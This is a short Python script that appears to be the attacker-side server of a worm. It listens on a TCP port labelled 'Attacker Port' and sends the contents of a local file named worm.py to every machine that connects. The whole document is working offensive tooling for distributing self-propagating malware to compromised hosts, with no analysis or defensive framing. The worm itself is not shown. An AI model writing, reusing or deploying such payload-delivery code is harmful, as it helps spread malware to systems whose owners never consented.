#!/usr/bin/python3
import socket, sys

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {__file__} <Attacker Port>")
        exit(1)

    atkr_port = int(sys.argv[1])
    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    skt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    skt.bind((socket.gethostname(), atkr_port))
    skt.listen(5)

    while True:
        conn, addr = skt.accept()
        with conn:
            print(f"Connection from {addr}")
            worm = open("worm.py", "rb")
            data = worm.read()
            while data:
                conn.send(data)
                data = worm.read()
            worm.close()
            conn.close()
